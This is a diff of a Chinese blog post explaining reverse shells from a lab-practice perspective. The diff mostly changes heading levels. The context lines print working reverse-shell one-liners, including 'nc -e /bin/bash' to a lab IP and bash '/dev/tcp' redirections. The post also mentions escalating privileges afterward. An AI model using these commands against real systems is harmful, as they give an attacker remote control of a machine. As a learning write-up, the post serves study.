@@ -1,19 +1,11 @@
----
-title: 反弹shell
-tags: web shell
-tags: shell
-renderNumberedHeading: true
-grammar_cjkRuby: true
----
+# 反弹shell原理简单理解
 
-
-欢迎使用 **{小书匠}(xiaoshujiang)编辑器**，您可以通过 `小书匠主按钮>模板` 里的模板管理来改变新建文章的内容。
-# 前言
+## 前言
 最近这几天在做那个DC的靶场，一直在用反弹shell，但是仅仅是知道基本的反弹shell，其他的一点也不知道，所以这次就来学习下反弹shell
-# 什么是反弹shell
+## 什么是反弹shell
 使用Google hack语法搜索了一下，发现了很多的讲反弹shell的文章，但是具体讲反弹shell原理的并没有几个。
 反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。
-# 为什么要用反弹shell
+## 为什么要用反弹shell
 反弹shell通常用于被控端因防火墙，权限不足，端口被占用等的情况
 举例：假设你现在进入了一个机器的端口，现在该做的就是从本机连接攻击端，这是最常见的攻击方式。远程桌面，web服务，ssh，telnet等等，都是正向连接。
 但是现在问题来了：
@@ -22,14 +14,14 @@ grammar_cjkRuby: true
 被控端防火墙受限，只能发送请求不能接收你的请求。
 这时，选择利用反弹shell才是上策。因此，反弹shell的方式就是被控端给攻击端发送请求建立连接的一种方式
 
-# 反弹shell的常见利用方式
-## 实验环境
+## 反弹shell的常见利用方式
+### 实验环境
 
 ``` javascript
 攻击机：kali linux：192.168.2.130
 被控机：centos：192.168.2.139
 ```
-## 开始
+### 开始
 攻击机监听端口：
 
 ``` javascript
@@ -49,7 +41,7 @@ python -c "import pty;pty.spawn('/bin/bash')"
 ```
 ![enter description here](./images/1622343003473.png)
 得到交互式界面。之后就可以进行提权等的一系列操作。
-## 命令说明
+### 命令说明
 在上面用到的命令`nc -e /bin/bash 192.168.2.130 4444`实现了反弹shell。
 
 ``` bash
@@ -144,5 +136,5 @@ bash -i > /dev/tcp/ip/port 0>&1
 bash -i > /dev/tcp/ip/port 0>&1 2>&1
 ```
 对于这些符号，网上有很多的师傅们都总结过用法以及意思，就不进行总结，这里给一下我看到的一个[师傅的文章](https://xz.aliyun.com/t/2548)写的相关内容
-# 总结
+## 总结
 对于反弹shell的方法有很多，网络上面有各种各样的形式的反弹shell，但是用起来原理都是一样的，看到有很多形式的反弹shell，就是只有形式不给原理，就想学习一下原理是什么，文中可能因为水平有限解释的不到位，还请海涵。
